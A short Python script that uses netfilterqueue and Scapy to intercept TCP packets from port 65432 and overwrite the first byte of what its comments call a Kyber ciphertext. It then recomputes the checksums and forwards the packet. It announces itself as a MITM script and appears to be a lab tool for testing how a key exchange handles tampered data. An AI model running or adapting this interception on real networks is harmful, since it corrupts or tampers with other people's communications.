import netfilterqueue
from scapy.all import IP, TCP, Raw

def modify_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(Raw):
        payload = scapy_packet[Raw].load

        # spot exact ciphertext packet (port 65432, size between 750 and 790 bytes)
        if scapy_packet[TCP].sport == 65432 and 750 <= len(payload) <= 790:
            print(f"[!] Packet detected (size : {len(payload)}). Changing the 5th byte payload...")

            # payload[:4]  -> keep the header to remain (the first 4 bytes of size)
            # b"X"         -> replace the 5th byte (the first byte of the Kyber ciphertext !)
            # payload[5:]  -> concatenate the rest of the message
            scapy_packet[Raw].load = payload[:4] + b"X" + payload[5:]

            # delete size and checksum metadata to force recalculation
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum

            # force reconstruction by Scapy
            scapy_packet = scapy_packet.__class__(bytes(scapy_packet))
            packet.set_payload(bytes(scapy_packet))
            print("[+] Packet modified and sent successfully !")
    packet.accept()

nfqueue = netfilterqueue.NetfilterQueue()
nfqueue.bind(1, modify_packet)

print("[+] Script MITM actif (Replacement) on port 65432...")
try:
    nfqueue.run()
except KeyboardInterrupt:
    print("\n[-] stopping.")
    nfqueue.unbind()